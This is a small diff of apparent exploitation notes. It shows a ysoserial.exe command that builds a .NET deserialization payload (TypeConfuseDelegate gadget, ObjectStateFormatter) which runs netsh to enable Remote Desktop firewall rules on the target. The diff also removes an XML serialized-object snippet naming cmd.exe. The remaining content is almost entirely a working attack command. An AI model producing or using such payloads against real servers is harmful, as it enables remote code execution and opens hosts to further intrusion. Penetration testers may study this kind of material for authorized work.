@@ -28,15 +28,3 @@ ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /
 ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 "
 ```
-
-
-
-
-
-```
-<?xml version="1.0"?>
-<testcl xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
- <_cmd>cmd.exe</_cmd>
-</testcl
-
-```
